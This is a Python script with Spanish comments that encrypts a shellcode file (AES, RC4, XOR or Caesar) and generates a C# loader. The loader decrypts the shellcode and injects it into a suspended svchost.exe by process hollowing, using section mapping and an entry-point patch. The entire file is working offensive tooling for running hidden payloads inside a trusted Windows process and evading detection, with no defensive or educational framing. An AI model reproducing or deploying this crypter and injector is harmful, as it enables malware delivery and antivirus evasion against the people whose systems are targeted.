from Crypto.Cipher import AES, ARC4
from Crypto.Util.Padding import pad
import os
import sys

def encrypt_shellcode_aes(shellcode_path, key):
    with open(shellcode_path, 'rb') as f:
        shellcode = f.read()

    iv = os.urandom(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted_shellcode = cipher.encrypt(pad(shellcode, AES.block_size))

    return iv, key, encrypted_shellcode

def encrypt_shellcode_caesar(shellcode_path, shift):
    with open(shellcode_path, 'rb') as f:
        shellcode = f.read()

    encrypted_shellcode = bytearray(((byte + shift) & 0xFF) for byte in shellcode)

    return encrypted_shellcode

def encrypt_shellcode_rc4(shellcode_path, key):
    with open(shellcode_path, 'rb') as f:
        shellcode = f.read()

    cipher = ARC4.new(key)
    encrypted_shellcode = cipher.encrypt(shellcode)

    return encrypted_shellcode

def encrypt_shellcode_xor(shellcode_path, key):
    with open(shellcode_path, 'rb') as f:
        shellcode = f.read()

    encrypted_shellcode = bytearray((byte ^ key) for byte in shellcode)

    return encrypted_shellcode

def generate_csharp_template(encrypted_shellcode, method, iv=None, key=None, shift=None, xor_key=None):
    encrypted_shellcode_str = ','.join(f'0x{b:02x}' for b in encrypted_shellcode)

    # Genera el código de descifrado específico para el método de cifrado elegido
    decryption_code = ""
    decryption_method = ""
    if method == "AES":
        iv_str = ','.join(f'0x{b:02x}' for b in iv)
        key_str = ','.join(f'0x{b:02x}' for b in key)
        decryption_code = f"""
            byte[] iv = new byte[] {{{iv_str}}};
            byte[] key = new byte[] {{{key_str}}};
            byte[] decryptedShellcode = AESDecrypt(encryptedShellcode, key, iv);
        """
        decryption_method = """
        private static byte[] AESDecrypt(byte[] data, byte[] key, byte[] iv)
        {{
            using (Aes aesAlg = Aes.Create())
            {{
                aesAlg.Key = key;
                aesAlg.IV = iv;

                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

                using (var msDecrypt = new System.IO.MemoryStream(data))
                {{
                    using (var csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {{
                        using (var srDecrypt = new System.IO.MemoryStream())
                        {{
                            csDecrypt.CopyTo(srDecrypt);
                            return srDecrypt.ToArray();
                        }}
                    }}
                }}
            }}
        }}
        """
    elif method == "Caesar":
        decryption_code = f"""
            int shift = {shift};
            byte[] decryptedShellcode = CaesarDecrypt(encryptedShellcode, shift);
        """
        decryption_method = """
        private static byte[] CaesarDecrypt(byte[] data, int shift)
        {{
            byte[] decrypted = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
            {{
                decrypted[i] = (byte)(((uint)data[i] - shift) & 0xFF);
            }}
            return decrypted;
        }}
        """
    elif method == "RC4":
        key_str = ','.join(f'0x{b:02x}' for b in key)
        decryption_code = f"""
            byte[] key = new byte[] {{{key_str}}};
            byte[] decryptedShellcode = RC4Decrypt(encryptedShellcode, key);
        """
        decryption_method = """
        private static byte[] RC4Decrypt(byte[] data, byte[] key)
        {{
            RC4 rc4 = new RC4(key);
            return rc4.EncryptDecrypt(data);
        }}

        public class RC4
        {{
            private byte[] S = new byte[256];
            private int x = 0;
            private int y = 0;

            public RC4(byte[] key)
            {{
                Initialize(key);
            }}

            private void Initialize(byte[] key)
            {{
                int keyLength = key.Length;
                for (int i = 0; i < 256; i++)
                {{
                    S[i] = (byte)i;
                }}

                int j = 0;
                for (int i = 0; i < 256; i++)
                {{
                    j = (j + S[i] + key[i % keyLength]) % 256;
                    Swap(i, j);
                }}
            }}

            private void Swap(int i, int j)
            {{
                byte temp = S[i];
                S[i] = S[j];
                S[j] = temp;
            }}

            public byte[] EncryptDecrypt(byte[] data)
            {{
                byte[] result = new byte[data.Length];
                for (int k = 0; k < data.Length; k++)
                {{
                    x = (x + 1) % 256;
                    y = (y + S[x]) % 256;
                    Swap(x, y);
                    result[k] = (byte)(data[k] ^ S[(S[x] + S[y]) % 256]);
                }}
                return result;
            }}
        }}
        """
    elif method == "XOR":
        decryption_code = f"""
            byte xorKey = {xor_key};
            byte[] decryptedShellcode = XORDecrypt(encryptedShellcode, xorKey);
        """
        decryption_method = """
        private static byte[] XORDecrypt(byte[] data, byte key)
        {{
            byte[] decrypted = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
            {{
                decrypted[i] = (byte)(data[i] ^ key);
            }}
            return decrypted;
        }}
        """

    # Plantilla C# adaptada para Process Hollowing con cifrado dinámico en svchost.exe
    template = f"""
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;
using System.Security.Cryptography;

namespace Hollowing
{{
    public sealed class Loader
    {{
        public static string HollowedProcessX85 = "C:\\\\Windows\\\\System32\\\\svchost.exe";

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {{
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }}

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {{
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }}

        [StructLayout(LayoutKind.Sequential)]
        internal struct STARTUPINFO
        {{
            uint cb;
            IntPtr lpReserved;
            IntPtr lpDesktop;
            IntPtr lpTitle;
            uint dwX;
            uint dwY;
            uint dwXSize;
            uint dwYSize;
            uint dwXCountChars;
            uint dwYCountChars;
            uint dwFillAttributes;
            uint dwFlags;
            ushort wShowWindow;
            ushort cbReserved;
            IntPtr lpReserved2;
            IntPtr hStdInput;
            IntPtr hStdOutput;
            IntPtr hStdErr;
        }}

        public const uint PageReadWriteExecute = 0x40;
        public const uint PageReadWrite = 0x04;
        public const uint PageExecuteRead = 0x20;
        public const uint MemCommit = 0x00001000;
        public const uint SecCommit = 0x08000000;
        public const uint GenericAll = 0x10000000;
        public const uint CreateSuspended = 0x00000004;
        public const uint DetachedProcess = 0x00000008;
        public const uint CreateNoWindow = 0x08000000;

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwCreateSection(ref IntPtr section, uint desiredAccess, IntPtr pAttrs, ref LARGE_INTEGER pMaxSize, uint pageProt, uint allocationAttribs, IntPtr hFile);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwMapViewOfSection(IntPtr section, IntPtr process, ref IntPtr baseAddr, IntPtr zeroBits, IntPtr commitSize, IntPtr stuff, ref IntPtr viewSize, int inheritDispo, uint alloctype, uint prot);

        [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern void GetSystemInfo(ref SYSTEM_INFO lpSysInfo);

        [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern IntPtr GetCurrentProcess();

        [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern void CloseHandle(IntPtr handle);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwUnmapViewOfSection(IntPtr hSection, IntPtr address);

        [DllImport("Kernel32.dll", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        private static extern bool CreateProcess(IntPtr lpApplicationName, string lpCommandLine, IntPtr lpProcAttribs, IntPtr lpThreadAttribs, bool bInheritHandles, uint dwCreateFlags, IntPtr lpEnvironment, IntPtr lpCurrentDir, [In] ref STARTUPINFO lpStartinfo, out PROCESS_INFORMATION lpProcInformation);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.StdCall)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, IntPtr nSize, out IntPtr lpNumWritten);

        [DllImport("kernel32.dll")]
        static extern uint GetLastError();

        [StructLayout(LayoutKind.Sequential)]
        public struct SYSTEM_INFO
        {{
            public uint dwOem;
            public uint dwPageSize;
            public IntPtr lpMinAppAddress;
            public IntPtr lpMaxAppAddress;
            public IntPtr dwActiveProcMask;
            public uint dwNumProcs;
            public uint dwProcType;
            public uint dwAllocGranularity;
            public ushort wProcLevel;
            public ushort wProcRevision;
        }}

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct LARGE_INTEGER
        {{
            public uint LowPart;
            public int HighPart;
        }}

        IntPtr section_;
        IntPtr localmap_;
        IntPtr remotemap_;
        IntPtr localsize_;
        IntPtr remotesize_;
        IntPtr pModBase_;
        IntPtr pEntry_;
        uint rvaEntryOffset_;
        uint size_;
        byte[] inner_;

        public uint round_to_page(uint size)
        {{
            SYSTEM_INFO info = new SYSTEM_INFO();

            GetSystemInfo(ref info);

            return (info.dwPageSize - size % info.dwPageSize) + size;
        }}

        const int AttributeSize = 24;

        private bool nt_success(long v)
        {{
            return (v >= 0);
        }}

        public IntPtr GetCurrent()
        {{
            return GetCurrentProcess();
        }}

        public KeyValuePair<IntPtr, IntPtr> MapSection(IntPtr procHandle, uint protect, IntPtr addr)
        {{
            IntPtr baseAddr = addr;
            IntPtr viewSize = (IntPtr)size_;


            long status = ZwMapViewOfSection(section_, procHandle, ref baseAddr, (IntPtr)0, (IntPtr)0, (IntPtr)0, ref viewSize, 1, 0, protect);

            if (!nt_success(status))
                throw new SystemException("[x] Something went wrong! " + status);

            return new KeyValuePair<IntPtr, IntPtr>(baseAddr, viewSize);
        }}

        public bool CreateSection(uint size)
        {{
            LARGE_INTEGER liVal = new LARGE_INTEGER();
            size_ = round_to_page(size);
            liVal.LowPart = size_;

            long status = ZwCreateSection(ref section_, GenericAll, (IntPtr)0, ref liVal, PageReadWriteExecute, SecCommit, (IntPtr)0);

            return nt_success(status);
        }}

        public void SetLocalSection(uint size)
        {{

            KeyValuePair<IntPtr, IntPtr> vals = MapSection(GetCurrent(), PageReadWriteExecute, IntPtr.Zero);
            if (vals.Key == (IntPtr)0)
                throw new SystemException("[x] Failed to map view of section!");

            localmap_ = vals.Key;
            localsize_ = vals.Value;

        }}

        public void CopyShellcode(byte[] buf)
        {{
            long lsize = size_;
            if (buf.Length > lsize)
                throw new IndexOutOfRangeException("[x] Shellcode buffer is too long!");

            unsafe
            {{
                byte* p = (byte*)localmap_;

                for (int i = 0; i < buf.Length; i++)
                {{
                    p[i] = buf[i];
                }}
            }}
        }}

        public PROCESS_INFORMATION StartProcess(string path)
        {{
            STARTUPINFO startInfo = new STARTUPINFO();
            PROCESS_INFORMATION procInfo = new PROCESS_INFORMATION();

            uint flags = CreateSuspended;

            if (!CreateProcess((IntPtr)0, path, (IntPtr)0, (IntPtr)0, false, flags, (IntPtr)0, (IntPtr)0, ref startInfo, out procInfo))
                throw new SystemException("[x] Failed to create process!");


            return procInfo;
        }}

        const ulong PatchSize = 0x10;

        public KeyValuePair<int, IntPtr> BuildEntryPatch(IntPtr dest)
        {{
            int i = 0;
            IntPtr ptr;

            ptr = Marshal.AllocHGlobal((IntPtr)PatchSize);

            unsafe
            {{
                byte* p = (byte*)ptr;
                byte[] tmp = null;

                if (IntPtr.Size == 4)
                {{
                    p[i] = 0xb8; // mov eax, <imm4>
                    i++;
                    Int32 val = (Int32)dest;
                    tmp = BitConverter.GetBytes(val);
                }}
                else
                {{
                    p[i] = 0x48; // rex
                    i++;
                    p[i] = 0xb8; // mov rax, <imm8>
                    i++;

                    Int64 val = (Int64)dest;
                    tmp = BitConverter.GetBytes(val);
                }}

                for (int j = 0; j < IntPtr.Size; j++)
                    p[i + j] = tmp[j];

                i += IntPtr.Size;
                p[i] = 0xff;
                i++;
                p[i] = 0xe0; // jmp [r|e]ax
                i++;
            }}

            return new KeyValuePair<int, IntPtr>(i, ptr);
        }}

        private IntPtr GetEntryFromBuffer(byte[] buf)
        {{
            IntPtr res = IntPtr.Zero;
            unsafe
            {{
                fixed (byte* p = buf)
                {{
                    uint e_lfanew_offset = *((uint*)(p + 0x3c)); // e_lfanew offset in IMAGE_DOS_HEADERS

                    byte* nthdr = (p + e_lfanew_offset);

                    byte* opthdr = (nthdr + 0x18); // IMAGE_OPTIONAL_HEADER start

                    ushort t = *((ushort*)opthdr);

                    byte* entry_ptr = (opthdr + 0x10); // entry point rva

                    int tmp = *((int*)entry_ptr);

                    rvaEntryOffset_ = (uint)tmp;

                    if (IntPtr.Size == 4)
                        res = (IntPtr)(pModBase_.ToInt32() + tmp);
                    else
                        res = (IntPtr)(pModBase_.ToInt64() + tmp);

                }}
            }}

            pEntry_ = res;
            return res;
        }}

        public IntPtr FindEntry(IntPtr hProc)
        {{
            PROCESS_BASIC_INFORMATION basicInfo = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;

            long success = ZwQueryInformationProcess(hProc, 0, ref basicInfo, (uint)(IntPtr.Size * 6), ref tmp);
            if (!nt_success(success))
                throw new SystemException("[x] Failed to get process information!");

            IntPtr readLoc = IntPtr.Zero;
            byte[] addrBuf = new byte[IntPtr.Size];
            if (IntPtr.Size == 4)
            {{
                readLoc = (IntPtr)((Int32)basicInfo.PebAddress + 8);
            }}
            else
            {{
                readLoc = (IntPtr)((Int64)basicInfo.PebAddress + 16);
            }}

            IntPtr nRead = IntPtr.Zero;

            if (!ReadProcessMemory(hProc, readLoc, addrBuf, addrBuf.Length, out nRead) || nRead == IntPtr.Zero)
                throw new SystemException("[x] Failed to read process memory!");

            if (IntPtr.Size == 4)
                readLoc = (IntPtr)(BitConverter.ToInt32(addrBuf, 0));
            else
                readLoc = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            pModBase_ = readLoc;
            if (!ReadProcessMemory(hProc, readLoc, inner_, inner_.Length, out nRead) || nRead == IntPtr.Zero)
                throw new SystemException("[x] Failed to read module start!");

            return GetEntryFromBuffer(inner_);
        }}

        public void MapAndStart(PROCESS_INFORMATION pInfo)
        {{

            KeyValuePair<IntPtr, IntPtr> tmp = MapSection(pInfo.hProcess, PageReadWriteExecute, IntPtr.Zero);
            if (tmp.Key == (IntPtr)0 || tmp.Value == (IntPtr)0)
                throw new SystemException("[x] Failed to map section into target process!");

            remotemap_ = tmp.Key;
            remotesize_ = tmp.Value;

            KeyValuePair<int, IntPtr> patch = BuildEntryPatch(tmp.Key);

            try
            {{

                IntPtr pSize = (IntPtr)patch.Key;
                IntPtr tPtr = new IntPtr();

                if (!WriteProcessMemory(pInfo.hProcess, pEntry_, patch.Value, pSize, out tPtr) || tPtr == IntPtr.Zero)
                    throw new SystemException("[x] Failed to write patch to start location! " + GetLastError());
            }}
            finally
            {{
                if (patch.Value != IntPtr.Zero)
                    Marshal.FreeHGlobal(patch.Value);
            }}

            byte[] tbuf = new byte[0x1000];
            IntPtr nRead = new IntPtr();
            if (!ReadProcessMemory(pInfo.hProcess, pEntry_, tbuf, 1024, out nRead))
                throw new SystemException("Failed!");

            uint res = ResumeThread(pInfo.hThread);
            if (res == unchecked((uint)-1))
                throw new SystemException("[x] Failed to restart thread!");

        }}

        public IntPtr GetBuffer()
        {{
            return localmap_;
        }}
        ~Loader()
        {{
            if (localmap_ != (IntPtr)0)
                ZwUnmapViewOfSection(section_, localmap_);

        }}

        public void Load(string targetProcess, byte[] shellcode)
        {{

            PROCESS_INFORMATION pinf = StartProcess(targetProcess);
            FindEntry(pinf.hProcess);

            if (!CreateSection((uint)shellcode.Length))
                throw new SystemException("[x] Failed to create new section!");

            SetLocalSection((uint)shellcode.Length);

            CopyShellcode(shellcode);

            MapAndStart(pinf);

            CloseHandle(pinf.hThread);
            CloseHandle(pinf.hProcess);

        }}

        public Loader()
        {{
            section_ = new IntPtr();
            localmap_ = new IntPtr();
            remotemap_ = new IntPtr();
            localsize_ = new IntPtr();
            remotesize_ = new IntPtr();
            inner_ = new byte[0x1000]; // Reserve a page of scratch space
        }}

        static void Main(string[] args)
        {{
            // Shellcode cifrada
            byte[] encryptedShellcode = new byte[] {{{encrypted_shellcode_str}}};

            {decryption_code}

            Loader ldr = new Loader();
            try
            {{
                ldr.Load(HollowedProcessX85, decryptedShellcode);
            }}
            catch (Exception e)
            {{
                Console.WriteLine("[x] Something went wrong!" + e.Message);
            }}
        }}

        // Agrega solo el método de descifrado relevante
        {decryption_method}
    }}
}}
"""
    return template

def main():
    if len(sys.argv) != 4:
        print("Usage: python3 script.py <shellcode.bin> <output.cs> <method>")
        print("Methods: AES, Caesar, RC4, XOR")
        sys.exit(1)

    shellcode_path = sys.argv[1]
    output_path = sys.argv[2]
    method = sys.argv[3]

    if method == "AES":
        key = os.urandom(32)  # Generate a random 256-bit key
        iv, key, encrypted_shellcode = encrypt_shellcode_aes(shellcode_path, key)
        csharp_code = generate_csharp_template(encrypted_shellcode, method, iv=iv, key=key)
    elif method == "Caesar":
        shift = 3  # Example shift value for Caesar cipher
        encrypted_shellcode = encrypt_shellcode_caesar(shellcode_path, shift)
        csharp_code = generate_csharp_template(encrypted_shellcode, method, shift=shift)
    elif method == "RC4":
        key = os.urandom(16)  # Generate a random 128-bit key for RC4
        encrypted_shellcode = encrypt_shellcode_rc4(shellcode_path, key)
        csharp_code = generate_csharp_template(encrypted_shellcode, method, key=key)
    elif method == "XOR":
        xor_key = os.urandom(1)[0]  # Generate a random single-byte key for XOR
        encrypted_shellcode = encrypt_shellcode_xor(shellcode_path, xor_key)
        csharp_code = generate_csharp_template(encrypted_shellcode, method, xor_key=xor_key)
    else:
        print("Invalid method. Choose AES, Caesar, RC4, or XOR.")
        sys.exit(1)

    with open(output_path, "w") as f:
        f.write(csharp_code)

    print(f"Generated {output_path} with {method}-encrypted shellcode for process hollowing in svchost.exe.")

if __name__ == "__main__":
    main()
